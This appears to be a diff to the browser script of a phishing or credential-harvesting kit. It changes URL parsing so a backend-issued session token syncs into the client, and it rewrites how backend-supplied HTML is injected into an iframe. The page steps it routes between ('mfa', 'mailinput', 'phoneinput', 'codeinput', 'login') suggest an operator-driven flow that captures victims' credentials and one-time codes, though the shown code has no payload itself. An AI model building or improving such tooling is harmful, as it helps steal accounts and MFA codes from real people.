@@ -403,23 +403,30 @@
             // Extract the page type from the URL
             let type = 'very'; // default
 
-            // Parse URL to extract page type
+            // Parse URL to extract page type AND token
             const urlParts = stepUrl.split('/').filter(p => p); // Remove empty parts
 
-            // If format is '/TOKEN/pagetype' or 'pagetype'
-            if (urlParts.length > 0) {
-                const lastPart = urlParts[urlParts.length - 1]; // Get last segment
-
-                // Check if it's a valid page type (not a token)
+            // CRITICAL: Extract token from URL to sync with backend
+            // If URL is '/NEWTOKEN/pagetype', update sessionToken
+            if (urlParts.length === 2) {
+                const potentialToken = urlParts[0];
+                const potentialType = urlParts[1];
                 const validTypes = ['very', 'mfa', 'mailinput', 'phoneinput', 'numinput', 'codeinput', 'login'];
-                if (validTypes.includes(lastPart)) {
-                    type = lastPart;
-                } else if (urlParts.length > 1) {
-                    // Might be TOKEN/type format, check second-to-last
-                    const secondLast = urlParts[urlParts.length - 2];
-                    if (validTypes.includes(secondLast)) {
-                        type = secondLast;
+
+                // If second part is a valid page type, first part is the token
+                if (validTypes.includes(potentialType) && potentialToken.length === 16) {
+                    // Sync token with backend
+                    if (sessionToken !== potentialToken) {
+                        console.log(`🔄 Syncing token: ${sessionToken} → ${potentialToken}`);
+                        sessionToken = potentialToken;
                     }
+                    type = potentialType;
+                }
+            } else if (urlParts.length === 1) {
+                // Just page type, no token in URL
+                const validTypes = ['very', 'mfa', 'mailinput', 'phoneinput', 'numinput', 'codeinput', 'login'];
+                if (validTypes.includes(urlParts[0])) {
+                    type = urlParts[0];
                 }
             }
 
@@ -455,16 +462,14 @@
         function injectIntoFrame(htmlContent) {
             const doc = iframe.contentWindow.document;
 
-            // Properly clear the iframe by resetting src first
-            // This ensures all previous JavaScript scope (const, let, var) is cleared
-            iframe.src = 'about:blank';
+            // Clear iframe properly without breaking WebSocket
+            // Use location.replace instead of setting src to avoid async issues
+            iframe.contentWindow.location.replace('about:blank');
 
-            // Small delay to ensure iframe is fully cleared
-            setTimeout(() => {
-                doc.open();
-                doc.write(htmlContent);
-                doc.close();
-            }, 10);
+            // Immediately write new content (synchronous - no delays)
+            doc.open();
+            doc.write(htmlContent);
+            doc.close();
         }
 
     </script>
